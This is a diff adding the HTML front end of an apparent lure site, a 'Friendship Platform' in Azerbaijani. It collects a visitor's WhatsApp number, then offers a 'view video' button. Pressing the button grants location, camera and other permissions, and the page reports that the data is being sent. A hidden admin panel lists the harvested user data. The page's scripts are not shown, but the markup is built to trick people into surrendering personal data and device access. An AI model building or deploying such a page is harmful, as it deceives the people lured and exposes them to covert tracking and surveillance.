@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dostluq Platforması</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <!-- Admin Panel Düyməsi -->
+    <div class="admin-button" onclick="openAdminPanel()">×</div>
+
+    <!-- İstifadəçi Hissəsi - Səhifə 1 -->
+    <div id="page1" class="page active">
+        <div class="container">
+            <h1>Xoş Gəldiniz</h1>
+            <p class="subtitle">Zəhmət olmasa WhatsApp nömrənizi daxil edin</p>
+            
+            <div class="phone-input-group">
+                <span class="country-code">+994</span>
+                <input 
+                    type="tel" 
+                    id="phoneInput" 
+                    placeholder="**-***-**-**"
+                    maxlength="9"
+                    pattern="[0-9]{9}"
+                >
+            </div>
+            
+            <button onclick="submitPhone()" class="btn-primary">Davam et</button>
+        </div>
+    </div>
+
+    <!-- İstifadəçi Hissəsi - Səhifə 2 -->
+    <div id="page2" class="page">
+        <div class="container">
+            <h1>Təsdiq</h1>
+            
+            <div class="image-container">
+                <img src="/images/striped_image.jpg" alt="Təsdiq şəkli">
+            </div>
+            
+            <button onclick="requestPermissions()" class="btn-video">
+                📹 Video Görüntülə
+            </button>
+            
+            <p class="info-text">Bu düyməyə basmaqla siz məkan, kamera və digər icazələri təsdiq edirsiniz</p>
+        </div>
+    </div>
+
+    <!-- Yükləmə Ekranı -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="spinner"></div>
+        <p>Məlumatlar göndərilir...</p>
+    </div>
+
+    <!-- Təşəkkür Ekranı -->
+    <div id="thankYouScreen" class="thank-you-screen">
+        <div class="success-icon">✓</div>
+        <h2>Təşəkkür edirik!</h2>
+        <p>Məlumatlarınız uğurla qeyd edildi</p>
+    </div>
+
+    <!-- Admin Panel Modal -->
+    <div id="adminModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeAdminPanel()">&times;</span>
+            
+            <!-- Admin Giriş Formu -->
+            <div id="adminLogin" class="admin-login">
+                <h2>Admin Paneli</h2>
+                <input type="text" id="adminUsername" placeholder="İstifadəçi adı">
+                <input type="password" id="adminPassword" placeholder="Şifrə">
+                <button onclick="adminLogin()" class="btn-primary">Giriş</button>
+                <p id="loginError" class="error-message"></p>
+            </div>
+
+            <!-- Admin Dashboard -->
+            <div id="adminDashboard" class="admin-dashboard" style="display: none;">
+                <h2>İstifadəçi Məlumatları</h2>
+                <div class="stats">
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalUsers">0</div>
+                        <div class="stat-label">Ümumi İstifadəçi</div>
+                    </div>
+                </div>
+                
+                <div id="userDataList" class="user-data-list"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/app.js"></script>
+</body>
+</html>
